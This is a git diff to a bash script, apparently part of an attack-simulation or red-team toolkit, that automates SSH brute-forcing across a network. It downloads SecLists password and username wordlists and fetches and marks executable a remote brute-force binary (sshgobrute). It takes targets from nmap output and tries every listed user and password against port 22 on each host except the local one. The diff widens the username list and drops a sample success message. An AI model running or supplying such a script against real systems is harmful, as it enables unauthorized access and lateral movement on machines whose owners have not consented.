@@ -44,6 +44,11 @@ HEAD=$(head -1 /tmp/found-passwords.txt)
 curl -LJ https://github.com/danielmiessler/SecLists/raw/master/Passwords/darkweb2017-top100.txt > /tmp/bruteforce-passwords.txt
 echo $HEAD >> /tmp/bruteforce-passwords.txt
 
+# keep first found user and append top short users lists
+HEAD=$(head -1 /tmp/found-users.txt)
+curl -LJ https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt > /tmp/bruteforce-users.txt
+echo $HEAD >> /tmp/bruteforce-users.txt
+
 # download brute force tool
 curl -LJ https://github.com/credibleforce/sshgobrute/releases/download/v0.0.1/sshgobrute -o /tmp/sshgobrute && chmod 755 /tmp/sshgobrute
 
@@ -76,12 +81,8 @@ cat /tmp/scan.json | ./jq -r '.nmaprun.host[] | select(.ports.port."@portid"=="2
 truncate -s0 /tmp/sshgobrute.txt
 # exclude local ip
 for target in $(cat /tmp/hydra-targets.txt | grep -v $LOCAL_IP); do
-    for user in $(cat /tmp/found-users.txt); do
+    for user in $(cat /tmp/bruteforce-users.txt); do
         echo "starting ssh brute force target: $user@$target" | tee -a /tmp/sshgobrute.txt
         /tmp/sshgobrute -ip $target -user $user -port 22 -file /tmp/bruteforce-passwords.txt | tee -a /tmp/sshgobrute.txt
     done
 done
-# example successful password
-# ###########################
-# Pattern found:  xxxxxxxxxxx
-# ###########################
